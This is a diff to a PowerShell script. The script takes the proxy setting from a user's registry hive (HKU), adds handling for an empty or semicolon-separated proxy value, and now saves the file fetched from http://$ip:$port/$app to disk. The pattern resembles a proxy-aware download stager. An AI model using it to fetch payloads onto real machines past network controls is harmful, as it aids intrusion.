@@ -15,8 +15,22 @@ foreach ($key in $keys) {
 }
 
 $proxyAddr = (Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer
-[System.Net.WebRequest]::DefaultWebProxy = New-Object System.Net.WebProxy("http://$proxyAddr")
+if (![string]::IsNullOrWhiteSpace($proxyAddr)) {
+    # If multiple proxies are set (separated by semicolons), use the first one
+    $firstProxy = $proxyAddr.Split(';')[0]
+    
+    try {
+        [System.Net.WebRequest]::DefaultWebProxy = New-Object System.Net.WebProxy("http://$firstProxy")
+    } catch {
+        Write-Error "Proxy string '$firstProxy' is not a valid URI."
+        exit
+    }
+} else {
+    Write-Host "No proxy address found in registry. Continuing without proxy."
+}
 
 $url = "http://$ip`:$port/$app"
+$dest = Join-Path -Path (Get-Location) -ChildPath (Split-Path $app -Leaf)
+
 $wc = New-Object System.Net.WebClient
-$wc.DownloadString($url)
+$wc.DownloadFile($url, $dest)
